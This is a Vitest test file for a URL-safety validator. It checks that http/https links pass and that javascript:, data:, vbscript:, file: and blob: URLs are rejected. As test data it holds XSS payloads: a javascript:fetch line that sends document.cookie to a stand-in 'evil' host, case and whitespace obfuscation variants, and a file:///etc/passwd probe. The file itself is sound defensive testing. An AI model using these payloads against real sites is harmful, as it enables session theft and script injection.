import { describe, it, expect } from "vitest";
import { isSafeHttpUrl, safeHttpUrl } from "./safeUrl";

describe("isSafeHttpUrl", () => {
  it("accepts the URLs we actually store", () => {
    expect(isSafeHttpUrl("https://www.aplustechsol.com/products/samsung-qb65")).toBe(true);
    expect(
      isSafeHttpUrl("https://firebasestorage.googleapis.com/v0/b/x/o/spec.pdf?alt=media&token=abc")
    ).toBe(true);
    expect(isSafeHttpUrl("http://localhost:3000/products/x")).toBe(true);
  });

  it("REJECTS javascript: — the agent-console takeover vector", () => {
    expect(isSafeHttpUrl("javascript:alert(1)")).toBe(false);
    expect(isSafeHttpUrl("javascript:fetch('https://evil/'+document.cookie)")).toBe(false);
  });

  it("rejects javascript: however it is dressed up", () => {
    // Scheme parsing is case-insensitive and tolerates leading/Øembedded
    // whitespace, so a naive startsWith("javascript:") check would miss these.
    expect(isSafeHttpUrl("JavaScript:alert(1)")).toBe(false);
    expect(isSafeHttpUrl("JAVASCRIPT:alert(1)")).toBe(false);
    expect(isSafeHttpUrl("  javascript:alert(1)")).toBe(false);
    expect(isSafeHttpUrl("java\tscript:alert(1)")).toBe(false);
    expect(isSafeHttpUrl("java\nscript:alert(1)")).toBe(false);
  });

  it("rejects other non-http schemes", () => {
    expect(isSafeHttpUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBe(false);
    expect(isSafeHttpUrl("vbscript:msgbox(1)")).toBe(false);
    expect(isSafeHttpUrl("file:///etc/passwd")).toBe(false);
    expect(isSafeHttpUrl("blob:https://x/y")).toBe(false);
  });

  it("rejects relative, empty and non-string input", () => {
    expect(isSafeHttpUrl("/products/x")).toBe(false);
    expect(isSafeHttpUrl("")).toBe(false);
    expect(isSafeHttpUrl("   ")).toBe(false);
    expect(isSafeHttpUrl(null)).toBe(false);
    expect(isSafeHttpUrl(undefined)).toBe(false);
    expect(isSafeHttpUrl(42)).toBe(false);
    expect(isSafeHttpUrl({ toString: () => "https://ok" })).toBe(false);
  });
});

describe("safeHttpUrl", () => {
  it("passes a safe URL through and drops an unsafe one", () => {
    expect(safeHttpUrl("https://x/y")).toBe("https://x/y");
    expect(safeHttpUrl("javascript:alert(1)")).toBeUndefined();
  });
});
